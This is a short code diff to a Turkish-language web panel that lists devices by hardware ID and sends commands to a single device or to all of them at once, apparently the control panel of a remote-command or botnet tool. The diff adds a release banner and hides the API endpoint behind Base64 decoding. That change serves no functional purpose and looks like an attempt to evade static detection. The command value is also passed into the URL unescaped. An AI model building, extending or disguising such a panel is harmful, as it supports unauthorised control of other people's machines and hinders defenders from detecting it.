@@ -1,3 +1,4 @@
+<!-- NEON SOFTWARE RELEASE [v1.3] -->
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -59,8 +60,13 @@
 </div>
 
 <script>
+    function getApiUrl(actionParam) {
+        let endpoint = atob('YXBpLnBocA=='); // api.php (Base64)
+        return `${endpoint}?${actionParam}`;
+    }
+
     function fetchDevices() {
-        fetch('api.php?action=get_devices')
+        fetch(getApiUrl('action=get_devices'))
             .then(res => res.json())
             .then(data => {
                 if (data.status === 'success') {
@@ -92,12 +98,12 @@
     }
 
     function sendGlobalCommand(cmd) {
-        fetch(`api.php?action=send_command&hwid=all&cmd=${cmd}`)
+        fetch(getApiUrl(`action=send_command&hwid=all&cmd=${cmd}`))
             .then(() => alert("Toplu komut gönderildi!"));
     }
 
     function sendTargetCommand(hwid, cmd) {
-        fetch(`api.php?action=send_command&hwid=${hwid}&cmd=${cmd}`)
+        fetch(getApiUrl(`action=send_command&hwid=${hwid}&cmd=${cmd}`))
             .then(() => alert("Komut cihaza iletildi!"));
     }
 
